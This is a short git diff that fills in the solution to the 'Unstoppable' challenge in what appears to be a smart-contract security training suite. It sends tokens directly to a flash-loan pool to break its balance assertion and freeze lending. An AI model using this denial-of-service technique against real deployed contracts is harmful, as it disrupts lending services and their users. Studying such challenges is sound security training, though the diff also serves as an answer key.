@@ -40,6 +40,10 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        const poolAddress = this.pool.address
+        // exploit UnstoppableLender.flashLoan()
+        // sending token directly to the pool will make assert(poolBalance == balanceBefore) return false
+        await this.token.transfer(poolAddress, INITIAL_ATTACKER_BALANCE, {from: attacker });
     });
 
     after(async function () {
